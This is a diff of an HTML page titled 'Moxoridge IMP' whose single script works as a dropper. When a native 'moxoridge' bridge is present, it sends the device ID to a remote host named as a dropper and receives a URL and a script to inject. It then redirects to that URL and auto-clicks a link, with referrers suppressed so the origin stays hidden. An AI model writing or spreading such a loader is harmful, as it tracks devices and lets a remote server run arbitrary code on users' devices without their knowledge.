@@ -1,37 +1,42 @@
 <!DOCTYPE html>
 <html lang="en">
+    <head>
+        <meta name="referrer" content="no-referrer" />
+        <meta charset="UTF-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+        <title>Moxoridge IMP</title>
+        <script>
+            if (typeof moxoridge !== "undefined" && moxoridge !== null) {
+                let did = moxoridge.did();
+                let time = 0;
+                moxoridge.writeT(time);
+                fetch(`https://xxtasks-dropper-test-xvmsofgqiy.ap-southeast-1.fcapp.run?did=${encodeURIComponent(did)}`)
+                    .then((response) => {
+                        if (!response.ok) {
+                            throw new Error("Network response was not ok");
+                        }
+                        return response.json();
+                    })
+                    .then((data) => {
+                        if (data.url && data.script) {
+                            moxoridge.redirect(data.url, data.script);
 
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Moxoridge IMP</title>
-    <script>
-        if (typeof moxoridge !== 'undefined' && moxoridge !== null) {
-            let did = moxoridge.did();
-            let time = 0;
-            moxoridge.writeT(time);
-            fetch(`https://xxtasks-dropper-test-xvmsofgqiy.ap-southeast-1.fcapp.run?did=${encodeURIComponent(did)}`)
-                .then(response => {
-                    if (!response.ok) {
-                        throw new Error('Network response was not ok');
-                    }
-                    return response.json();
-                })
-                .then(data => {
-                    if (data.url && data.script) {
-                        moxoridge.redirect(data.url, data.script);
-                    }else{
-                        moxoridge.completed();
-                    }
-                })
-                .catch(error => {
-                    console.error('There has been a problem with your fetch operation:', error);
-                });
-        }
-    </script>
-</head>
-
-<body>
-</body>
-
+                            setTimeout(() => {
+                                const link = document.createElement("a");
+                                link.href = data.url;
+                                link.rel = "noreferrer";
+                                document.body.appendChild(link);
+                                link.click();
+                            }, 1000); // 延迟 2000 毫秒 (2 秒)
+                        } else {
+                            moxoridge.completed();
+                        }
+                    })
+                    .catch((error) => {
+                        console.error("There has been a problem with your fetch operation:", error);
+                    });
+            }
+        </script>
+    </head>
+    <body></body>
 </html>
